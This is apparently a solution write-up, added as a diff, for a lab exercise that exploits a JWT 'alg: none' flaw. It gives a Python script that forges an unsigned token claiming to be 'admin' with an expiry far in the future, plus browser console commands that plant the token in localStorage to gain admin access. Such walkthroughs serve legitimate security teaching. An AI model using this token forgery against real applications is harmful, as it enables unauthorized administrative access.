@@ -1,0 +1,61 @@
+Create an account using the Sign Up form.
+
+The web page has been modified to use a JSON web token instead of a session cookie. The token is accessible using the browser's `localStorage` API.
+
+Open up the web developer tools to a javascript console and enter:
+
+```
+localStorage.getItem('token')
+```
+
+And you'll see the token!
+
+The claimset only has `sub` and `exp` claims which can be modified to `"admin"` and a large number equal to a unix timestamp far in the future, like 2 billion.
+
+The header can be modified to change the `alg` to `"none"` and the signature can be modified to be blank since the `none` algorithm doesn't use a signature.
+
+
+The following script could be used to generate such a token.
+
+```python
+import json
+import base64
+
+def create_jwt():
+    # Header with 'none' algorithm
+    header = {
+        "alg": "none",
+        "typ": "JWT"
+    }
+    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
+
+    # Payload with 'sub' as 'admin' and 'exp' as 2000000000
+    payload = {
+        "sub": "admin",
+        "exp": 2000000000
+    }
+    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
+
+    # Construct JWT without signature
+    jwt_token = f"{encoded_header}.{encoded_payload}."
+    return jwt_token
+
+# Create and print the JWT
+jwt_token = create_jwt()
+print("JWT Token:", jwt_token)
+
+```
+
+The resulting token is:
+
+```
+eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYWRtaW4iLCAiZXhwIjogMjAwMDAwMDAwMH0.
+```
+
+Use the javascript console to set the value of the token in localstorage:
+
+```
+localStorage.setItem('token', 'eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYWRtaW4iLCAiZXhwIjogMjAwMDAwMDAwMH0.')
+```
+
+Then reload the page. You are now authenticated as the admin user!
